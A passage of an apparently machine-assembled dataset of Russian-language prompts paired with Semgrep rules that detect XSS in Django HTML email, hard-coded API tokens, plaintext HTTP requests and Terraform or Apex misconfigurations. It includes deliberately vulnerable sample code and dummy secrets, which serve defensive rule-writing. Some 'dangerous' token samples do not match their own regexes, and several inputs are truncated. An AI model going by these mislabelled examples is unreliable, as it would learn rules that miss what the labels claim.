    "output": "rules:\n- id: xss-html-email-body\n  message: >-\n    Found request data in an EmailMessage that is set to use HTML.\n    This is dangerous because HTML emails are susceptible to XSS.\n    An attacker could inject data into this HTML email, causing XSS.\n  metadata:\n    cwe:\n    - \"CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')\"\n    owasp:\n    - A03:2021 - Injection\n    references:\n    - https://www.damonkohler.com/2008/12/email-injection.html\n    category: security\n    technology:\n    - django\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: MEDIUM\n    confidence: MEDIUM\n  languages: [python]\n  severity: WARNING\n  patterns:\n  - pattern-inside: |\n      def $FUNC(...):\n        ...\n        $EMAIL.content_subtype = \"html\"\n        ...\n  - pattern-either:\n    - pattern: django.core.mail.EmailMessage($SUBJ, request.$W.get(...), ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        django.core.mail.EmailMessage($SUBJ, $DATA, ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        $INTERM = $DATA\n        ...\n        django.core.mail.EmailMessage($SUBJ, $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        django.core.mail.EmailMessage($SUBJ, $B.$C(..., $DATA, ...), ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        $INTERM = $B.$C(..., $DATA, ...)\n        ...\n        django.core.mail.EmailMessage($SUBJ, $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        django.core.mail.EmailMessage($SUBJ, $STR % $DATA, ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        $INTERM = $STR % $DATA\n        ...\n        django.core.mail.EmailMessage($SUBJ, $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        django.core.mail.EmailMessage($SUBJ, f\"...{$DATA}...\", ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        $INTERM = f\"...{$DATA}...\"\n        ...\n        django.core.mail.EmailMessage($SUBJ, $INTERM, ...)\n    - pattern: $A = django.core.mail.EmailMessage($SUBJ, request.$W.get(...), ...)\n    - pattern: return django.core.mail.EmailMessage($SUBJ, request.$W.get(...), ...)\n    - pattern: django.core.mail.EmailMessage($SUBJ, request.$W(...), ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        django.core.mail.EmailMessage($SUBJ, $DATA, ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        $INTERM = $DATA\n        ...\n        django.core.mail.EmailMessage($SUBJ, $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        django.core.mail.EmailMessage($SUBJ, $B.$C(..., $DATA, ...), ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        $INTERM = $B.$C(..., $DATA, ...)\n        ...\n        django.core.mail.EmailMessage($SUBJ, $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        django.core.mail.EmailMessage($SUBJ, $STR % $DATA, ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        $INTERM = $STR % $DATA\n        ...\n        django.core.mail.EmailMessage($SUBJ, $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        django.core.mail.EmailMessage($SUBJ, f\"...{$DATA}...\", ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        $INTERM = f\"...{$DATA}...\"\n        ...\n        django.core.mail.EmailMessage($SUBJ, $INTERM, ...)\n    - pattern: $A = django.core.mail.EmailMessage($SUBJ, request.$W(...), ...)\n    - pattern: return django.core.mail.EmailMessage($SUBJ, request.$W(...), ...)\n    - pattern: django.core.mail.EmailMessage($SUBJ, request.$W[...], ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        django.core.mail.EmailMessage($SUBJ, $DATA, ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        $INTERM = $DATA\n        ...\n        django.core.mail.EmailMessage($SUBJ, $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        django.core.mail.EmailMessage($SUBJ, $B.$C(..., $DATA, ...), ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        $INTERM = $B.$C(..., $DATA, ...)\n        ...\n        django.core.mail.EmailMessage($SUBJ, $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        django.core.mail.EmailMessage($SUBJ, $STR % $DATA, ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        $INTERM = $STR % $DATA\n        ...\n        django.core.mail.EmailMessage($SUBJ, $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        django.core.mail.EmailMessage($SUBJ, f\"...{$DATA}...\", ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        $INTERM = f\"...{$DATA}...\"\n        ...\n        django.core.mail.EmailMessage($SUBJ, $INTERM, ...)\n    - pattern: $A = django.core.mail.EmailMessage($SUBJ, request.$W[...], ...)\n    - pattern: return django.core.mail.EmailMessage($SUBJ, request.$W[...], ...)\n    - pattern: django.core.mail.EmailMessage($SUBJ, request.$W, ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        django.core.mail.EmailMessage($SUBJ, $DATA, ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        $INTERM = $DATA\n        ...\n        django.core.mail.EmailMessage($SUBJ, $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        django.core.mail.EmailMessage($SUBJ, $B.$C(..., $DATA, ...), ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        $INTERM = $B.$C(..., $DATA, ...)\n        ...\n        django.core.mail.EmailMessage($SUBJ, $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        django.core.mail.EmailMessage($SUBJ, $STR % $DATA, ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        $INTERM = $STR % $DATA\n        ...\n        django.core.mail.EmailMessage($SUBJ, $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        django.core.mail.EmailMessage($SUBJ, f\"...{$DATA}...\", ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        $INTERM = f\"...{$DATA}...\"\n        ...\n        django.core.mail.EmailMessage($SUBJ, $INTERM, ...)\n    - pattern: $A = django.core.mail.EmailMessage($SUBJ, request.$W, ...)\n    - pattern: return django.core.mail.EmailMessage($SUBJ, request.$W, ...)\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования данных запроса непосредственно в теле HTML-электронной почты, отправляемой через Django. В Django электронная почта может быть настроена для отправки HTML-сообщений с использованием метода 'content_subtype'. Правило ищет случаи, когда данные запроса используются напрямую или косвенно в качестве содержимого HTML-электронной почты, что делает их уязвимыми для XSS-атак.\n\n# Ключевые элементы:\n- ID: xss-html-email-body\n- Язык: python \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "xss-html-email-body",
      "language": "python",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Сгенерируй правило Semgrep для поиска: adafruit-api-key\nОписание уязвимости: A gitleaks adafruit-api-key was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: regex",
    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: INFO\n\nКонтекст кода:\n// File: adafruit-api-key.go\n// ruleid: adafruit-api-key\nadafruit_api_token = \"9zu9r6idf9c0tfcc4w26l66ij7visb8n\"  # Ограничиваем длину\n\nОпасные паттерны:\n• // ruleid: adafruit-api-key\nadafruit_api_token = \"9zu9r6idf9c0tfcc4w26l66ij7visb8n\"\n• // ruleid: adafruit-api-key\nconst adafruitApiKey = '9zu9r6idf9c0tfcc4w26l66ij7visb8n'\n• // ruleid: adafruit-api-key\nprivate static readonly string AdafruitApiKey = \"9zu9r6idf9c0tfcc4w26l66ij7visb8n\"\n\nБезопасные паттерны:  \n• // safe: adafruit-api-key\nstring apiToken = GetAdafruitApiKeyFromEnvironment();\n• // safe: adafruit-api-key\nvar adafruitApiKey = GetApiKeyFromSecureVault();\n• // safe: adafruit-api-key\nprivate static readonly string AdafruitApiKey = GetApiKeyFromConfigFile();\n\nЛегенда аннотаций:\n- // ruleid:adafruit-api-key: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:adafruit-api-key: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: adafruit-api-key\n  message: A gitleaks adafruit-api-key was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\n  languages:\n    - regex\n  severity: INFO\n  metadata:\n      likelihood: LOW\n      impact: MEDIUM\n      confidence: LOW\n      category: security\n      cwe:\n        - \"CWE-798: Use of Hard-coded Credentials\"\n      cwe2021-top25: true\n      cwe2022-top25: true\n      owasp:\n        - A07:2021 - Identification and Authentication Failures\n      references:\n        - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html\n      source-rule-url: https://github.com/zricethezav/gitleaks/tree/master/cmd/generate/config/rules\n      subcategory:\n        - vuln\n      technology:\n        - gitleaks\n  patterns:\n    - pattern-regex: (?i)(?:adafruit)(?:[0-9a-z\\-_\\t .]{0,20})(?:[\\s|']|[\\s|\"]){0,3}(?:=|>|:{1,3}=|\\|\\|:|<=|=>|:|\\?=)(?:'|\\\"|\\s|=|\\x60){0,5}([a-z0-9_-]{32})(?:['|\\\"|\\n|\\r|\\s|\\x60|;]|$)\n\n\n# Логика правила:\nЭто правило Semgrep использует регулярное выражение для поиска жестко закодированного ключа Adafruit API в исходном коде. Регулярное выражение ищет строку, содержащую слово 'adafruit' в любом регистре, за которым следуют произвольные символы длиной от 0 до 20, затем символ '=' или один из нескольких специальных символов, после чего следует строка из 32 символов, представляющих собой комбинацию букв и цифр. Это соответствует типичному формату API-клюса Adafruit.\n\n# Ключевые элементы:\n- ID: adafruit-api-key\n- Язык: regex \n- Тип: vuln\n- Серьезность: INFO",
    "metadata": {
      "rule_id": "adafruit-api-key",
      "language": "regex",
      "severity": "INFO",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: gcp-gke-enable-shielded-nodes\nОписание уязвимости: Ensure Shielded GKE Nodes are Enabled\nCWE: \nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: gcp-gke-enable-shielded-nodes.tf\n# ok: gcp-gke-enable-shielded-nodes\nresource \"google_container_cluster\" \"success1\" {\n  name               = var.name\n  location           = var.location\n  initial_node_count = 1\n  project            = data.google_project.project.name\n\n  network    = var.network\n  subnetwork = var.subnetwork\n\n  ip_allocation_policy {\n    cluster_ipv4_cidr_block       = var.ip_allocation_policy[\"cluster_ipv4_cidr_block\"]\n    cluster_secondary_range_name  = var.ip_allocation_policy[\"cluster_secondary_range_name\"]\n    services_ipv4_cidr_block      = var.ip_allocation_policy[\"services_ipv4_cidr_block\"]\n    services_secondary_range_name = var.ip_allocation_policy[\"services_secondary_range_name\"]\n  }\n\n  remove_default_node_pool = var.remove_default_node_pool\n\n  node_config {\n    workload_metadata_config {\n      node_metadata = \"GKE_METADATA_SERVER\"\n    }\n  }\n\n  release_channel {\n    channel = var.release_channel\n  }\n\n  master_auth {\n    client_certificate_config {\n      issue_client_certificate = false\n    }\n  }\n\n  addons_config {\n    http_load_balancing {\n      disabled = var.http_load_balancing_disabled\n    }\n\n    network_policy_config {\n      disabled = var.network_policy_config_disabled\n    }\n  }\n\n  maintenance_policy {\n    daily_maintenance_window {\n      start_time = var.maintenance_window\n    }\n  }\n\n  private_cluster_config {\n    enable_private_nodes    = var.private_cluster_config[\"enable_private_nodes\"]\n    enable_private_endpoint = var.private_cluster_config[\"enable_private_endpoint\"]\n    master_ipv4_cidr_block  = var.private_cluster_config[\"master_ipv4_cidr_block\"]\n  }\n\n  master_authorized_networks_config {\n    cidr_blocks {\n      cidr_block = var.master_authorized_network_cidr\n    }\n  }\n\n  network_policy {\n    enabled = true\n  }\n\n  pod_security_policy_config {\n    enabled = var.pod_security_policy_config_enabled\n  }\n\n  resource_labels = var.resource_labels\n}\n\n# ok: gcp-gke-enable-shielded-nodes\nresource \"google_container_cluster\" \"succe  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"google_container_cluster\" \"fail\" { ... enable_shielded_nodes = false ... }\n\nБезопасные паттерны:  \n• resource \"google_container_cluster\" \"success2\" { ... enable_shielded_nodes = true ... }\n\nЛегенда аннотаций:\n- // ruleid:gcp-gke-enable-shielded-nodes: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:gcp-gke-enable-shielded-nodes: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: gcp-gke-enable-shielded-nodes\n  patterns:\n    - pattern: resource\n    - pattern-inside: |\n          resource \"google_container_cluster\" \"...\" {\n          ...\n          enable_shielded_nodes = false\n          ...\n          }\n  message: >-\n    Ensure Shielded GKE Nodes are Enabled\n  metadata:\n    category: best-practice\n    technology:\n      - terraform\n      - gcp\n  languages: [hcl]\n  severity: WARNING\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования ресурса Google Container Cluster (google_container_cluster) в конфигурациях Terraform, где атрибут 'enable_shielded_nodes' установлен в значение 'false'. Правило использует шаблон 'pattern-inside', который ищет ресурс с указанным именем и затем проверяет наличие конкретного условия внутри блока конфигурации этого ресурса.\n\n# Ключевые элементы:\n- ID: gcp-gke-enable-shielded-nodes\n- Язык: hcl \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "gcp-gke-enable-shielded-nodes",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Составь правило Semgrep для: use-assert-class\nОписание уязвимости: Assert methods in the System class have been replaced with the Assert class: https://developer.salesforce.com/docs/atlas.en-us.apexref.meta/apexref/apex_class_System_Assert.htm\nCWE: \nТип анализа: search\nЯзык: generic",
    "input": "Требования:\n- Язык: generic\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: UseAssertClass.cls\npublic class UseAssertClass {\n\t// ruleid: use-assert-class\n\tSystem.assert(true);\n\n\t// ruleid: use-assert-class\n\tSystem.assertEquals(1,1);\n\n\t// ruleid: use-assert-class\n\tSystem.assertNotEquals(1,1);\n\n\t// ok: use-assert-class\n\tAssert.areEqual(1,1);\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: UseAssertClass.cls\npublic class UseAssertClass {\n\t// ruleid: use-assert-class\nSystem.assert(true);\n}\n• // File: UseAssertClass.cls\npublic class UseAssertClass {\n\t// ruleid: use-assert-class\nSystem.assertEquals(1,1);\n}\n• // File: UseAssertClass.cls\npublic class UseAssertClass {\n\t// ruleid: use-assert-class\nSystem.assertNotEquals(1,1);\n}\n\nБезопасные паттерны:  \n• // File: UseAssertClass.cls\npublic class UseAssertClass {\n\t// ok: use-assert-class\nAssert.areEqual(1,1);\n}\n\nЛегенда аннотаций:\n- // ruleid:use-assert-class: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:use-assert-class: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: use-assert-class\n    min-version: 1.44.0\n    severity: WARNING\n    languages:\n      - generic\n    metadata:\n      category: best-practice\n      references:\n      - https://developer.salesforce.com/docs/atlas.en-us.apexref.meta/apexref/apex_class_System_Assert.htm\n      technology:\n      - salesforce\n    message: >-\n      Assert methods in the System class have been replaced with the Assert class:\n      https://developer.salesforce.com/docs/atlas.en-us.apexref.meta/apexref/apex_class_System_Assert.htm\n    pattern-regex: System\\.assert\n    paths:\n      include:\n        - \"*.cls\"\n        - \"UseAssertClass.cls\"\n\n\n# Логика правила:\nЭто правило Semgrep выполняет поиск использования методов assert в классе System. Паттерн использует регулярное выражение 'System.assert' для поиска вызовов этих методов. Правило применимо только к файлам с расширением '.cls' или содержащим строку 'UseAssertClass.cls'. Пример опасного кода включает вызовы System.assert, System.assertEquals и System.assertNotEquals, которые должны быть заменены методами класса Assert.\n\n# Ключевые элементы:\n- ID: use-assert-class\n- Язык: generic \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "use-assert-class",
      "language": "generic",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: react-insecure-request\nОписание уязвимости: Unencrypted request over HTTP detected.\nCWE: CWE-319: Cleartext Transmission of Sensitive Information\nТип анализа: search\nЯзык: typescript",
    "input": "Требования:\n- Язык: typescript\n- Тип анализа: search\n- CWE: CWE-319: Cleartext Transmission of Sensitive Information\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: react-insecure-request.tsx\nimport axios from 'axios';\n\n// ruleid: react-insecure-request\nfetch('http://www.example.com', 'GET', {})\n\nlet addr = \"http://www.example.com\"\n// ruleid: react-insecure-request\nfetch(addr, 'POST', {})\n\n// ruleid: react-insecure-request\naxios.get('http://www.example.com');\n\n// ruleid: react-insecure-request\nconst options = {\n  method: 'POST',\n  headers: { 'content-type': 'application/x-www-form-urlencoded' },\n  data: qs.stringify(data),\n  url: 'http://www.example.com',\n};\naxios(options);\n\n// ruleid: react-insecure-request\naxios({ method: 'POST', url: 'http://www.example.com' });\n\n// ok: react-insecure-request\nfetch('https://www.example.com', 'GET', {})\n\n// ok: react-insecure-request\naxios.get('https://www.example.com');\n\n// ok: react-insecure-request\nconst options = {\n  method: 'POST',\n  url: 'https://www.example.com',\n};\naxios(options);\n\n// ok: react-insecure-request\naxios.get('http://localhost/foo');\n\n\n// File: react-insecure-request.jsx\nimport axios from 'axios';\n\n// ruleid: react-insecure-request\nfetch('http://www.example.com', 'GET', {})\n\nlet addr = \"http://www.example.com\"\n// ruleid: react-insecure-request\nfetch(addr, 'POST', {})\n\n// ruleid: react-insecure-request\naxios.get('http://www.example.com');\n\n// ruleid: react-insecure-request\nconst options = {\n  method: 'POST',\n  headers: { 'content-type': 'application/x-www-form-urlencoded' },\n  data: qs.stringify(data),\n  url: 'http://www.example.com',\n};\naxios(options);\n\n// ruleid: react-insecure-request\naxios({ method: 'POST', url: 'http://www.example.com' });\n\n// ok: react-insecure-request\nfetch('https://www.example.com', 'GET', {})\n\n// ok: react-insecure-request\naxios.get('https://www.example.com');\n\n// ok: react-insecure-request\nconst options = {\n  method: 'POST',\n  url: 'https://www.example.com',\n};\naxios(options);\n\n// ok: react-insecure-request\naxios.get('http://localhost/foo');  # Ограничиваем длину\n\nОпасные паттерны:\n• fetch('http://www.example.com', 'GET', {})\n• let addr = \"http://www.example.com\"; fetch(addr, 'POST', {})\n• axios.get('http://www.example.com')\n\nБезопасные паттерны:  \n• fetch('https://www.example.com', 'GET', {})\n• axios.get('https://www.example.com')\n• const options = {method: 'POST', url: 'https://www.example.com'}; axios(options)\n\nЛегенда аннотаций:\n- // ruleid:react-insecure-request: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:react-insecure-request: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: react-insecure-request\n  message: >-\n    Unencrypted request over HTTP detected.\n  metadata:\n    vulnerability: Insecure Transport\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    - A02:2021 - Cryptographic Failures\n    cwe:\n    - 'CWE-319: Cleartext Transmission of Sensitive Information'\n    references:\n    - https://www.npmjs.com/package/axios\n    category: security\n    technology:\n    - react\n    subcategory:\n    - vuln\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: MEDIUM\n  languages:\n  - typescript\n  - javascript\n  severity: ERROR\n  patterns:\n    - pattern-either:\n        - patterns:\n          - pattern-either:\n              - pattern-inside: |\n                  import $AXIOS from 'axios';\n                  ...\n                  $AXIOS.$METHOD(...)\n              - pattern-inside: |\n                  $AXIOS = require('axios');\n                  ...\n                  $AXIOS.$METHOD(...)\n          - pattern: $AXIOS.$VERB(\"$URL\",...)\n          - metavariable-regex:\n              metavariable: $VERB\n              regex: ^(get|post|delete|head|patch|put|options)\n        - patterns:\n          - pattern-either:\n              - pattern-inside: |\n                  import $AXIOS from 'axios';\n                  ...\n                  $AXIOS(...)\n              - pattern-inside: |\n                  $AXIOS = require('axios');\n                  ...\n                  $AXIOS(...)\n          - pattern-either:\n              - pattern: '$AXIOS({url: \"$URL\"}, ...)'\n              - pattern: |\n                  $OPTS = {url: \"$URL\"}\n                  ...\n                  $AXIOS($OPTS, ...)\n        - pattern: fetch(\"$URL\", ...)\n    - metavariable-regex:\n          metavariable: $URL\n          regex: ^([Hh][Tt][Tt][Pp]:\\/\\/(?!localhost).*)\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска небезопасных запросов HTTP, передающих чувствительную информацию в открытом виде. Анализируется использование библиотеки axios и встроенной функции fetch в TypeScript и JavaScript. Правило ищет вызовы этих функций с URL-адресами, начинающимися с http:// (за исключением localhost), что указывает на отсутствие шифрования при передаче данных.\n\n# Ключевые элементы:\n- ID: react-insecure-request\n- Язык: typescript \n- Тип: vuln\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "react-insecure-request",
      "language": "typescript",
      "severity": "ERROR",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения scalingo-api-token\nОписание уязвимости: A gitleaks scalingo-api-token was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: regex",
    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: INFO\n\nКонтекст кода:\n// File: scalingo-api-token.go\n// ruleid: scalingo-api-token\nscalingo_api_token = \"tk-us-ns252m_p0--275mtyfum_uuz654r-2rc5vqgkyixkjw3a9ed\"  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: scalingo-api-token.go\n// ruleid: scalingo-api-token\nscalingo_api_token = \"tk-us-ns252m_p0--275mtyfum_uuz654r-2rc5vqgkyixkjw3a9ed\"\n• // File: another-scalingo-go-file.go\n// ruleid: scalingo-api-token\nvar myToken string = \"tk-us-abc123def456ghijklmnopqrstuvwx-yz0123456789\"\n• // File: yet-another-scalingo-file.go\n// ruleid: scalingo-api-token\nconst apiKey = \"tk-us-qwertyuiopasdfghjklzxcvbnm1234567890\"\n\nБезопасные паттерны:  \n• // File: safe-scalingo-go-file.go\n// idempotent: safe-scalingo-api-token\nscalingo_api_token := os.Getenv(\"SCALINGO_API_TOKEN\")\n• // File: secure-scalingo-go-file.go\n// idempotent: safe-scalingo-api-token\napi_key := getSecureApiKeyFromVault()\n• // File: no-scalingo-go-file.go\n// idempotent: no-scalingo-api-token\nsomeVar := \"random-string\"\n\nЛегенда аннотаций:\n- // ruleid:scalingo-api-token: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:scalingo-api-token: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: scalingo-api-token\n  message: A gitleaks scalingo-api-token was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\n  languages:\n    - regex\n  severity: INFO\n  metadata:\n      likelihood: LOW\n      impact: MEDIUM\n      confidence: LOW\n      category: security\n      cwe:\n        - \"CWE-798: Use of Hard-coded Credentials\"\n      cwe2021-top25: true\n      cwe2022-top25: true\n      owasp:\n        - A07:2021 - Identification and Authentication Failures\n      references:\n        - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html\n      source-rule-url: https://github.com/zricethezav/gitleaks/tree/master/cmd/generate/config/rules\n      subcategory:\n        - vuln\n      technology:\n        - gitleaks\n  patterns:\n    - pattern-regex: \\b(tk-us-[a-zA-Z0-9-_]{48})(?:['|\\\"|\\n|\\r|\\s|\\x60|;]|$)\n\n\n# Логика правила:\nЭто правило Semgrep использует регулярное выражение для поиска жестко закодированного токена API Scalingo в исходном коде. Паттерн ищет строку, начинающуюся с 'tk-us-', за которой следует ровно 48 символов, состоящих из букв и цифр, и заканчивающуюся одним из специальных символов или концом строки. Это соответствует формату токенов API Scalingo. Правило применимо только к языкам, поддерживающим регулярные выражения.\n\n# Ключевые элементы:\n- ID: scalingo-api-token\n- Язык: regex \n- Тип: vuln\n- Серьезность: INFO",
    "metadata": {
      "rule_id": "scalingo-api-token",
      "language": "regex",
      "severity": "INFO",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: digitalocean-refresh-token\nОписание уязвимости: A gitleaks digitalocean-refresh-token was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: regex",
    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: INFO\n\nКонтекст кода:\n// File: digitalocean-refresh-token.go\n// ruleid: digitalocean-refresh-token\ndo_api_token = \"dor_v1_bd1ebc2aada42ea89a27ae57a9903eaa3f57f873f84ce69a9a19c1c923cbd027\"  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: digitalocean-refresh-token.go\n// ruleid: digitalocean-refresh-token\ndo_api_token = \"dor_v1_bd1ebc2aada42ea89a27ae57a9903eaa3f57f873f84ce69a9a19c1c923cbd027\"\n• // File: another-digitalocean-refresh-token.go\n// ruleid: digitalocean-refresh-token\ndo_refresh_token := \"dor_v1_abc123def456ghijkl789mnopqrstuvwx0yz\"\n\nБезопасные паттерны:  \n• // File: safe-code.go\n// idempotent: safe-code\nglobal_api_key := os.Getenv(\"DO_API_KEY\")\n• // File: secure-code.go\n// idempotent: secure-code\nvar doRefreshToken string = getSecureTokenFromVault()\n\nЛегенда аннотаций:\n- // ruleid:digitalocean-refresh-token: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:digitalocean-refresh-token: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: digitalocean-refresh-token\n  message: A gitleaks digitalocean-refresh-token was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\n  languages:\n    - regex\n  severity: INFO\n  metadata:\n      likelihood: LOW\n      impact: MEDIUM\n      confidence: LOW\n      category: security\n      cwe:\n        - \"CWE-798: Use of Hard-coded Credentials\"\n      cwe2021-top25: true\n      cwe2022-top25: true\n      owasp:\n        - A07:2021 - Identification and Authentication Failures\n      references:\n        - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html\n      source-rule-url: https://github.com/zricethezav/gitleaks/tree/master/cmd/generate/config/rules\n      subcategory:\n        - vuln\n      technology:\n        - gitleaks\n  patterns:\n    - pattern-regex: (?i)\\b(dor_v1_[a-f0-9]{64})(?:['|\\\"|\\n|\\r|\\s|\\x60|;]|$)\n\n\n# Логика правила:\nЭто правило Semgrep использует регулярное выражение для поиска жестко закодированного токена refresh token сервиса DigitalOcean. Регулярное выражение ищет строку, начинающуюся с 'dor_v1_' за которой следует последовательность из 64 шестнадцатеричных символов. Оно также учитывает различные разделители, такие как одинарные и двойные кавычки, символы новой строки, табуляции и другие специальные символы, которые могут использоваться для разделения строковых литералов в коде.\n\n# Ключевые элементы:\n- ID: digitalocean-refresh-token\n- Язык: regex \n- Тип: vuln\n- Серьезность: INFO",
    "metadata": {
      "rule_id": "digitalocean-refresh-token",
      "language": "regex",
      "severity": "INFO",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: session-cookie-samesitenone\nОписание уязвимости: Found SameSiteNoneMode setting in Gorilla session options. Consider setting SameSite to Lax, Strict or Default for enhanced security.\nCWE: CWE-1275: Sensitive Cookie with Improper SameSite Attribute\nТип анализа: search\nЯзык: go",
